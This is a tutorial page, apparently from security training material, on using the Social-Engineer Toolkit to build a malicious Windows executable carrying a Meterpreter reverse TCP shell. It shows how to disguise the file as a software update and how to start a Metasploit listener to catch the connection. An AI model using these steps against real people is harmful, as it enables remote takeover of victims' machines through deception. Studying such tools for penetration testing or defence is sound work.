---
title: "Infectious Media Generator"
description: ""
icon: "code"
draft: false
---

Right now, you should have SET setup on your system. We can spin it up by running 
```sh
sudo setoolkit
```

###  Infectious Media Generator

The Infectious Media Generator in SET allows you to create malicious files, such as PDFs and EXEs, that can trigger a reverse Meterpreter shell when opened. This section will guide you through the process of creating a malicious EXE.

SET has many options for malicious payloads, but they may be limited depending on the software and operating system versions the target is using

### Getting Started
From the SET main menu, select one "Social-Engineering Attacks."
Choose three "Infectious Media Generator."

There are two options inside the **Infectious Media Generator**, **File-Format Exploits** and **Standard Metasploit Executable**.

#### File-Format Exploits
This attack vector exploits vulnerabilities in popular formats like PDFs, Microsoft Office documents, and image files. Attackers craft malicious files containing embedded payloads that, when opened by unsuspecting users, exploit these vulnerabilities to gain unauthorized access to their systems.

The primary advantage of this approach is its stealthiness, as the malicious files often appear legitimate and are less likely to raise suspicion. Moreover, users perceive these file formats as harmless, making them more likely to be opened.

These are dependent on the OS version of the target system.

#### Standard Metasploit Executable
Using the Metasploit Framework, this attack vector involves creating a standalone executable containing a malicious payload.

When a user runs the executable, the payload is executed, and the attacker gains control over the target system. This approach is more straightforward than File-Format Exploits, as it doesn't rely on exploiting specific vulnerabilities in file formats.

However, it may also be more conspicuous, as users are generally more cautious when running unfamiliar executables. A successful attack using this vector often relies on strong social engineering techniques to convince the target to run the executable, such as disguising it as a software update, a useful utility, or a desirable file.

## Choosing the Standard Metasploit Executable
You will be asked to select the reverse shell you want to use. For this option, choose two, which is the Windows Meterpreter Reverse TCP shell. Enter the IP address and port for your listener.

The Social Engineering Toolkit will now create the malicious exe file, call it payload.exe, and save it to the `/root/.set` directory.

You can now rename the file to something else if you want. An attacker might change the name to something that will entice a victim to click on it, such as an update for an application.
```sh
mv payload.exe <any_name.exe
```

Start the multi-handler in metasploit using the same IP and port you chose above and type run.
```sh
mfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <ip_address>
set lport <port>
run
```

The ip_address and port are the ones you've set up earlier.

